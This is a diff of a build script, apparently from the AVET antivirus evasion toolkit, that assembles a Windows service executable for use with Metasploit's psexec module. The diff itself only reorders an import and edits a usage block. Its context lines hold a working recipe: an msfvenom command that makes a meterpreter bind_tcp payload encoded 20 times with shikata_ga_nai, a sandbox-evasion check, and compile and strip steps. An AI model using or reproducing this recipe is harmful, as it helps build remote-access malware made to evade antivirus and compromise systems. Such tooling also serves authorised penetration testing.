@@ -5,6 +5,7 @@
 # Designed for use with msf psexec module!
 #DESCRIPTION_END
 
+
 # print AVET logo
 cat banner.txt
 
@@ -12,6 +13,9 @@ cat banner.txt
 # you can edit the compiler in build/global_win32.sh
 # or enter $win32_compiler="mycompiler" here
 . build/global_win32.sh
+
+# import feature construction interface
+. build/feature_construction.sh
 
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
@@ -30,9 +34,6 @@ generate_key preset aabbcc12de input/key_raw.txt
 
 # make meterpreter bind payload, encoded 20 rounds with shikata_ga_nai
 msfvenom -p windows/meterpreter/bind_tcp lport=$LPORT -e x86/shikata_ga_nai -i 20 -f raw -a x86 --platform Windows > input/sc_raw.txt
-
-# import feature construction interface
-. build/feature_construction.sh
 
 # add evasion techniques
 add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
@@ -72,7 +73,7 @@ strip output/svc_20xshikata_bindtcp_win32.exe
 # cleanup
 cleanup_techniques
 
-
-#USAGE_START
+echo "
 TODO
-#USAGE_END
+"
+
